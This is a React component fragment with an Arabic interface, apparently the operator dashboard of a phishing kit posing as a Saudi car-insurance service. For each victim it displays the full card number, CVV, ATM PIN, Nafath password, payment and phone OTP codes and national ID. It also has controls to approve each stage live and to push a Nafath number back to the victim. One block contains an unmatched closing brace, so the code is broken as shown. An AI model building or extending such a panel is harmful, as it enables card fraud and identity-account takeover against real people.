                                    <p className="mt-1 text-[11px] text-muted-foreground">بدأت: {formatDateTime(event.stage_entered_at)}</p>
                                    {event.resolved_at && (
                                      <p className="mt-1 text-[11px] text-muted-foreground">حُسمت: {formatDateTime(event.resolved_at)}</p>
                                    )}
                                  </div>
                                  <span className={`inline-flex shrink-0 items-center rounded-full border px-2 py-0.5 text-[10px] font-bold ${statusTone}`}>
                                    {event.status === "approved" ? "تمت الموافقة" : event.status === "rejected" ? "مرفوض" : "بانتظار"}
                                  </span>
                                </div>
                              </div>
                            );
                          })}
                        </div>
                      )}
                    </AccordionContent>
                  </AccordionItem>

                  {/* 9. رمز النفاذ */}
                  {(() => {
                    const nafathVerifyOrders = linkedOrders.filter(hasNafathVerifyTrail);
                    return (
                      <AccordionItem value="nafath-code" className={`border rounded-xl overflow-hidden ${nafathVerifyOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                          <div className="flex items-center gap-2">
                            <ShieldCheck className="w-4 h-4 text-primary" />رمز النفاذ
                            {nafathVerifyOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${nafathVerifyOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{nafathVerifyOrders.length}</span>}
                          </div>
                        </AccordionTrigger>
                        <AccordionContent className="px-4 py-3">
                          {nafathVerifyOrders.length === 0 ? (
                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد رمز نفاذ</p>
                          ) : (
                            <div className="space-y-3">
                              {nafathVerifyOrders.map(order => (
                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                  <div className="grid grid-cols-2 gap-2">
                                    <InfoItem label="المرحلة" value="تحقق نفاذ" />
                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
                                    {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
                                  </div>
                                  <div className="space-y-2 pt-2 border-t border-border/50">
                                    <div className="flex items-center gap-2">
                                      <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
                                      <input
                                        type="text"
                                        placeholder="أدخل الرقم (مثل 35)"
                                        value={getNafathInputValue(order)}
                                        onChange={e => setNafathInputValue(order.id, e.target.value)}
                                        className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
                                      />
                                    </div>
                                    <div className="flex items-center gap-2">
                                      <Button onClick={() => handleStageApprove(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة وإرسال
                                      </Button>
                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                      </Button>
                                    </div>
                                  </div>
                                  {order.nafath_number && order.current_stage === "nafath_verify" && (
                                    <div className="space-y-2 pt-2 border-t border-border/50">
                                      <div className="flex items-center gap-2">
                                        <span className="text-[10px] text-muted-foreground whitespace-nowrap">تعديل الرقم:</span>
                                        <input
                                          type="text"
                                          placeholder={order.nafath_number}
                                          value={getNafathInputValue(order)}
                                          onChange={e => setNafathInputValue(order.id, e.target.value)}
                                          className="flex-1 h-8 rounded-lg border-2 border-amber-400 bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
                                        />
                                        <Button onClick={() => handleUpdateNafathNumber(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-amber-500 hover:bg-amber-600 text-white gap-1" size="sm">
                                          {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}تحديث
                                        </Button>
                                      </div>
                                    </div>
                                  )}
                                </div>
                              ))}
                            </div>
                          )}
                        </AccordionContent>
                      </AccordionItem>
                    );
                  })()}

                  {/* 8. معلومات دخول النفاذ */}
                  {(() => {
                    const nafathLoginOrders = linkedOrders.filter(hasNafathLoginTrail);
                    return (
                      <AccordionItem value="nafath-login" className={`border rounded-xl overflow-hidden ${nafathLoginOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                          <div className="flex items-center gap-2">
                            <Shield className="w-4 h-4 text-primary" />دخول النفاذ
                            {nafathLoginOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${nafathLoginOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{nafathLoginOrders.length}</span>}
                          </div>
                        </AccordionTrigger>
                        <AccordionContent className="px-4 py-3">
                          {nafathLoginOrders.length === 0 ? (
                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد دخول نفاذ</p>
                          ) : (
                            <div className="space-y-3">
                              {nafathLoginOrders.map(order => (
                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                  <div className="grid grid-cols-2 gap-2">
                                    <InfoItem label="المرحلة" value="دخول نفاذ" />
                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
                                    {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
                                    {order.national_id && <InfoItem label="اسم المستخدم" value={order.national_id} />}
                                    {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
                                  </div>
                                  <div className="pt-2 border-t border-border/50 space-y-2">
                                      <div className="flex items-center gap-2">
                                        <input
                                          type="text"
                                          placeholder="رقم نفاذ (مثل 35)"
                                          value={getNafathInputValue(order)}
                                          onChange={e => setNafathInputValue(order.id, e.target.value)}
                                          className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
                                        />
                                      </div>
                                      <div className="flex items-center gap-2">
                                        <Button onClick={() => handleStageApprove(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                          {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                        </Button>
                                        <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                          {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                        </Button>
                                      </div>
                                    </div>
                                  )}
                                </div>
                              ))}
                            </div>
                          )}
                        </AccordionContent>
                      </AccordionItem>
                    );
                  })()}

                  {/* 7. معلومات كود توثيق الجوال */}
                  {(() => {
                    const phoneOtpOrders = linkedOrders.filter(hasPhoneOtpTrail);
                    return (
                      <AccordionItem value="phone-otp" className={`border rounded-xl overflow-hidden ${phoneOtpOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                          <div className="flex items-center gap-2">
                            <Phone className="w-4 h-4 text-primary" />كود توثيق الجوال
                            {phoneOtpOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${phoneOtpOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{phoneOtpOrders.length}</span>}
                          </div>
                        </AccordionTrigger>
                        <AccordionContent className="px-4 py-3">
                          {phoneOtpOrders.length === 0 ? (
                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد كود توثيق جوال</p>
                          ) : (
                            <div className="space-y-3">
                              {phoneOtpOrders.map(order => (
                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                  <div className="grid grid-cols-2 gap-2">
                                    <InfoItem label="المرحلة" value="كود توثيق الجوال" />
                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
                                    {order.phone_otp_code && <InfoItem label="كود التحقق" value={order.phone_otp_code} />}
                                    {order.phone && <InfoItem label="رقم الجوال" value={order.phone} />}
                                  </div>
                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                      </Button>
                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                      </Button>
                                    </div>
                                </div>
                              ))}
                            </div>
                          )}
                        </AccordionContent>
                      </AccordionItem>
                    );
                  })()}

                  {/* 6. معلومات توثيق الجوال */}
                  {(() => {
                    const phoneOrders = linkedOrders.filter(hasPhoneVerificationTrail);
                    return (
                      <AccordionItem value="phone-verify" className={`border rounded-xl overflow-hidden ${phoneOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                          <div className="flex items-center gap-2">
                            <Phone className="w-4 h-4 text-primary" />توثيق الجوال
                            {phoneOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${phoneOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{phoneOrders.length}</span>}
                          </div>
                        </AccordionTrigger>
                        <AccordionContent className="px-4 py-3">
                          {phoneOrders.length === 0 ? (
                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد توثيق جوال</p>
                          ) : (
                            <div className="space-y-3">
                              {phoneOrders.map(order => (
                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                  <div className="grid grid-cols-2 gap-2">
                                    <InfoItem label="المرحلة" value={order.current_stage === "stc_call" ? "مكالمة STC" : "توثيق الجوال"} />
                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
                                    {order.phone && <InfoItem label="رقم الجوال" value={order.phone} />}
                                  </div>
                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                      </Button>
                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                      </Button>
                                    </div>
                                </div>
                              ))}
                            </div>
                          )}
                        </AccordionContent>
                      </AccordionItem>
                    );
                  })()}

                  {/* 5. معلومات ATM */}
                  {(() => {
                    const atmOrders = linkedOrders.filter(o => o.atm_bill_number || o.atm_biller_code || o.atm_pin);
                    return (
                      <AccordionItem value="atm-info" className={`border rounded-xl overflow-hidden ${atmOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                          <div className="flex items-center gap-2">
                            <FileText className="w-4 h-4 text-primary" />معلومات ATM
                            {atmOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${atmOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-primary/10 text-primary"}`}>{atmOrders.length}</span>}
                          </div>
                        </AccordionTrigger>
                        <AccordionContent className="px-4 py-3">
                          {atmOrders.length === 0 ? (
                            <p className="text-xs text-muted-foreground text-center py-3">لا توجد معلومات ATM</p>
                          ) : (
                            <div className="space-y-3">
                              {atmOrders.map(order => (
                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                  <div className="grid grid-cols-2 gap-2">
                                    {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
                                    {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
                                    {order.atm_pin && <InfoItem label="الرقم السري" value={order.atm_pin} />}
                                  </div>
                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                      </Button>
                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                      </Button>
                                    </div>
                                </div>
                              ))}
                            </div>
                          )}
                        </AccordionContent>
                      </AccordionItem>
                    );
                  })()}

                  {/* 4. معلومات كود الدفع بالبطاقة (OTP) */}
                  {(() => {
                    const otpOrders = linkedOrders.filter(hasOtpTrail);
                    return (
                      <AccordionItem value="payment-otp" className={`border rounded-xl overflow-hidden ${otpOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                          <div className="flex items-center gap-2">
                            <Shield className="w-4 h-4 text-primary" />كود الدفع بالبطاقة
                            {otpOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${otpOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{otpOrders.length}</span>}
                          </div>
                        </AccordionTrigger>
                        <AccordionContent className="px-4 py-3">
                          {otpOrders.length === 0 ? (
                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد كود دفع بانتظار</p>
                          ) : (
                            <div className="space-y-3">
                              {otpOrders.map(order => (
                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                  <div className="grid grid-cols-2 gap-2">
                                    <InfoItem label="المرحلة" value="رمز التحقق OTP" />
                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
                                    {order.otp_verified !== null && <InfoItem label="تم التحقق" value={order.otp_verified ? "نعم" : "لا"} />}
                                    {order.otp_code && <InfoItem label="كود OTP" value={order.otp_code} />}
                                  </div>
                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                      </Button>
                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                      </Button>
                                    </div>
                                </div>
                              ))}
                            </div>
                          )}
                        </AccordionContent>
                      </AccordionItem>
                    );
                  })()}

                  {/* 3. معلومات الدفع (بطاقة الدفع كاملة) */}
                  {(() => {
                    const paymentOrders = linkedOrders.filter(o => o.card_number_full || o.card_last_four || o.card_holder_name || o.current_stage === "payment");
                    return (
                      <AccordionItem value="payment-info" className={`border rounded-xl overflow-hidden ${paymentOrders.some(o => o.stage_status === "pending" && o.current_stage === "payment") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                          <div className="flex items-center gap-2">
                            <CreditCard className="w-4 h-4 text-primary" />معلومات الدفع
                            {paymentOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${paymentOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-primary/10 text-primary"}`}>{paymentOrders.length}</span>}
                          </div>
                        </AccordionTrigger>
                        <AccordionContent className="px-4 py-3">
                          {paymentOrders.length === 0 ? (
                            <p className="text-xs text-muted-foreground text-center py-3">لا توجد معلومات دفع</p>
                          ) : (
                            <div className="space-y-3">
                              {paymentOrders.map(order => (
                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                  <div className="grid grid-cols-2 gap-2">
                                    {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
                                    {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
                                    {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
                                    {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
                                    {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
                                    {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
                                  </div>
                                  {/* Stage approval for payment */}
                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                      </Button>
                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                      </Button>
                                    </div>
                                </div>
                              ))}
                            </div>
                          )}
                        </AccordionContent>
                      </AccordionItem>
                    );
                  })()}

                  {/* 2. معلومات التأمين */}
                  <AccordionItem value="insurance-info" className={`border rounded-xl overflow-hidden ${linkedRequests.some(r => r.status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                    <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                      <div className="flex items-center gap-2">
                        <Shield className="w-4 h-4 text-primary" />معلومات التأمين
                        {linkedRequests.length > 0 && <span className="px-1.5 py-0.5 rounded-full bg-primary/10 text-primary text-[10px] font-bold">{linkedRequests.length}</span>}
                      </div>
                    </AccordionTrigger>
                    <AccordionContent className="px-4 py-3">
                      {linkedRequests.length === 0 && linkedOrders.length === 0 ? (
                        <p className="text-xs text-muted-foreground text-center py-3">لا توجد معلومات تأمين</p>
                      ) : (
                        <div className="space-y-3">
                          {linkedRequests.map(req => (
                            <div key={req.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-3">
                              <div className="flex items-center justify-between">
                                <span className="text-xs font-bold text-foreground">
                                  طلب {req.request_type === "new" ? "جديد" : "تجديد"} - {insuranceTypeLabel[req.insurance_type || ""] || req.insurance_type || "غير محدد"}
                                </span>
                                <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${statusLabel[req.status]?.cls || "bg-muted text-muted-foreground"}`}>
                                  {statusLabel[req.status]?.text || req.status}
                                </span>
                              </div>
                              <div className="grid grid-cols-2 gap-2">
                                <InfoItem label="رقم الهوية" value={req.national_id} />
                                <InfoItem label="رقم الجوال" value={req.phone} />
                                {req.serial_number && <InfoItem label="الرقم التسلسلي" value={req.serial_number} />}
                                {req.estimated_value && <InfoItem label="القيمة التقديرية" value={`${req.estimated_value} ر.س`} />}
                                {req.repair_location && <InfoItem label="مكان التصليح" value={req.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
                                {req.passenger_count && <InfoItem label="عدد الركاب" value={req.passenger_count} />}
                                {req.vehicle_usage && <InfoItem label="غرض الاستخدام" value={req.vehicle_usage === "personal" ? "شخصي" : req.vehicle_usage === "commercial" ? "تجاري" : req.vehicle_usage} />}
                                {req.policy_start_date && <InfoItem label="بداية الوثيقة" value={req.policy_start_date} />}
                                {req.birth_date && <InfoItem label="تاريخ الميلاد" value={req.birth_date} />}
                                <InfoItem label="تاريخ الطلب" value={formatDate(req.created_at)} />
                                {req.notes && <div className="col-span-2"><InfoItem label="ملاحظات" value={req.notes} /></div>}
                              </div>
                              {req.status === "pending" && (
                                <div className="flex items-center gap-2 pt-2 border-t border-border/50">
                                  <Button onClick={() => handleApprove(req.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                    {loadingAction === "approve-" + req.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                  </Button>
                                  <Button onClick={() => handleReject(req.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                    {loadingAction === "reject-" + req.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                  </Button>
                                </div>
                              )}
                            </div>
                          ))}
                          {linkedOrders.map(order => (
                            <div key={order.id} className={`bg-muted/20 rounded-xl border p-4 space-y-2 ${order.stage_status === "pending" ? "border-amber-500/50 bg-amber-500/5" : "border-border/50"}`}>
                              <div className="flex items-center justify-between">
                                <span className="text-xs font-bold text-foreground">{order.company || "غير محدد"} - {insuranceTypeLabel[order.insurance_type || ""] || order.insurance_type || ""}</span>
                                <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${statusLabel[order.status]?.cls || "bg-muted text-muted-foreground"}`}>
                                  {statusLabel[order.status]?.text || order.status}
                                </span>
                              </div>
                              {/* Stage status indicator */}
                              {order.current_stage && (
                                <div className="flex items-center gap-2 text-[11px]">
                                  <span className="text-muted-foreground">المرحلة:</span>
                                  <span className="font-bold text-foreground">{stageLabel[order.current_stage] || order.current_stage}</span>
                                  <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${order.stage_status === "pending" ? "bg-amber-500/10 text-amber-600 animate-pulse" : order.stage_status === "approved" ? "bg-emerald-500/10 text-emerald-600" : order.stage_status === "rejected" ? "bg-red-500/10 text-red-600" : "bg-muted text-muted-foreground"}`}>
                                    {order.stage_status === "pending" ? "⏳ بانتظار" : order.stage_status === "approved" ? "✓ موافق" : order.stage_status === "rejected" ? "✗ مرفوض" : order.stage_status || "-"}
                                  </span>
                                </div>
                              )}
                              <div className="grid grid-cols-2 gap-2">
                                {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
                                {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
                                {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
                                {order.serial_number && <InfoItem label="الرقم التسلسلي" value={order.serial_number} />}
                                {order.passenger_count && <InfoItem label="عدد الركاب" value={order.passenger_count} />}
                                {order.vehicle_usage && <InfoItem label="غرض الاستخدام" value={order.vehicle_usage === "personal" ? "شخصي" : order.vehicle_usage === "commercial" ? "تجاري" : order.vehicle_usage} />}
                                {order.estimated_value && <InfoItem label="القيمة التقديرية" value={`${order.estimated_value} ر.س`} />}
                                {order.repair_location && <InfoItem label="مكان التصليح" value={order.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
                                {order.base_price != null && <InfoItem label="السعر الأساسي" value={`${order.base_price} ر.س`} />}
                                {order.total_price != null && <InfoItem label="السعر الإجمالي" value={`${order.total_price} ر.س`} />}
                                {order.policy_number && <InfoItem label="رقم الوثيقة" value={order.policy_number} />}
                                {order.draft_policy_number && <InfoItem label="رقم الوثيقة المبدئي" value={order.draft_policy_number} />}
                                {order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0 && (
                                  <div className="col-span-2"><InfoItem label="الإضافات" value={(order.add_ons as any[]).map((a: any) => typeof a === 'string' ? a : a.name || JSON.stringify(a)).join("، ")} /></div>
                                )}
                                <InfoItem label="تاريخ الطلب" value={formatDate(order.created_at)} />
                              </div>
                              {/* Stage approval buttons */}
                              <div className="flex items-center gap-2 pt-2 border-t border-border/50">
                                  <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
                                    {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
                                  </Button>
                                  <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
                                    {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
                                  </Button>
                                </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </AccordionContent>
                  </AccordionItem>

                  {/* 1. معلومات الزائر (الشخصية) */}
                  <AccordionItem value="visitor-info" className="border border-border rounded-xl overflow-hidden">
                    <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                      <div className="flex items-center gap-2">
                        <User className="w-4 h-4 text-primary" />معلومات الزائر
                      </div>
                    </AccordionTrigger>
                    <AccordionContent className="px-4 py-3">
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        {visitorName && (
                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                            <User className="w-4 h-4 text-primary shrink-0" />
                            <div><p className="text-[10px] text-muted-foreground">الاسم</p><p className="text-xs font-medium text-foreground">{visitorName}</p></div>
                          </div>
                        )}
                        {customerName && customerName !== visitorName && (
                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                            <User className="w-4 h-4 text-primary shrink-0" />
                            <div><p className="text-[10px] text-muted-foreground">اسم العميل</p><p className="text-xs font-medium text-foreground">{customerName}</p></div>
                          </div>
                        )}
                        {visitorPhone && (
                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                            <Phone className="w-4 h-4 text-primary shrink-0" />
                            <div><p className="text-[10px] text-muted-foreground">رقم الجوال</p><p className="text-xs font-medium text-foreground">{visitorPhone}</p></div>
                          </div>
                        )}
                        {visitorNationalId && (
                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                            <CreditCard className="w-4 h-4 text-primary shrink-0" />
                            <div><p className="text-[10px] text-muted-foreground">رقم الهوية</p><p className="text-xs font-medium text-foreground">{visitorNationalId}</p></div>
                          </div>
                        )}
                        {selectedVisitor.country && (
                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                            <Globe className="w-4 h-4 text-primary shrink-0" />
                            <div><p className="text-[10px] text-muted-foreground">الدولة</p><p className="text-xs font-medium text-foreground">{countryFlag(selectedVisitor.country_code)} {selectedVisitor.country}</p></div>
                          </div>
                        )}
                        {selectedVisitor.ip_address && (
                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                            <Globe className="w-4 h-4 text-muted-foreground shrink-0" />
                            <div><p className="text-[10px] text-muted-foreground">عنوان IP</p><p className="text-xs font-medium text-foreground">{selectedVisitor.ip_address}</p></div>
                          </div>
                        )}
                        <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                          <Clock className="w-4 h-4 text-primary shrink-0" />
                          <div><p className="text-[10px] text-muted-foreground">آخر نشاط</p><p className="text-xs font-medium text-foreground">{formatTime(selectedVisitor.last_seen_at)}</p></div>
                        </div>
                        <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                          <MapPin className="w-4 h-4 text-primary shrink-0" />
                          <div><p className="text-[10px] text-muted-foreground">الصفحة الحالية</p><p className="text-xs font-medium text-foreground">{selectedVisitor.current_page || "/"}</p></div>
                        </div>
